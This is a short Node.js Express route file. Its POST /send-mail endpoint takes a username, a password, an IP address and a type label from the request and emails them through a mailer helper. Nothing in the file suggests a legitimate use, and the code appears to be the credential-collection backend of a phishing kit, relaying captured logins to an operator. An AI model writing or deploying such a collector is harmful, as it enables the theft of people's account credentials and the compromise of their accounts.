let express = require('express')
let router = express.Router()
let mailer = require('../helper/mailer')

router.post('/send-mail', (req, res) => {
    sendEmail(res, req.body.username, req.body.pass, req.body.ip, req.body.type)
})

function sendEmail(res, username, pass, ip, type) {
    mailer.sendEmail(res, `${type}: ${username}: ${ip}`, username, pass, ip, type)
}

module.exports = router
